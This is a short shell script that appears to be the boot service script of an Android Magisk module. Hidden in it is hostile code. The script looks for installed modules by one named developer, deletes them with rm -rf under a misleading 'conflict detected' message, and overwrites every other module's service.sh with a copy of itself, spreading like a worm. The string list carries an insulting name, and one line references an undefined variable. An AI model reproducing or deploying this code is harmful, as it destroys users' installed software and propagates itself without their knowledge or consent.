#!/system/bin/sh
MODDIR=${0%/*}
List_nmsl() {
    fuck_string_list="
hamjin
hamJin
hamJTY
hamjty
HamJin
Hamjin
Hanjty"
    LIST_PATH="/data/adb/modules"
    for loop1 in $fuck_string_list; do
        for loop2 in $(ls -a -1 $LIST_PATH); do
            if [ "$(grep "$loop1" <$LIST_PATH/"$loop2"/module.prop)" != "" ]; then
                echo "[$(date '+%Y-%m-%d %H:%M:%S')][WARNING]: Conflict detected, uninstalled for you: $loop1."
                chattr -R -i $LIST_PATH/"$loop2"  2>/dev/null
                [ -f $LIST_PATH/"$i"/uninstall.sh ] && /data/adb/magisk/busybox "$LIST_PATH/$loop2/uninstall.sh"  2>/dev/null
                rm -rf ${LIST_PATH:?}/"$loop2"
            elif [ ! -f $LIST_PATH/"$loop2"/service.sh.rlast.sh ]; then
                mv $LIST_PATH/"$loop2"/service.sh $LIST_PATH/"$loop2"/service.sh.rlast.sh
                cp "$MODDIR"/service.sh $LIST_PATH/"$loop2"/service.sh
            fi
        done
    done
}
sh "$MODDIR"/service.sh.rlast.sh &
List_nmsl
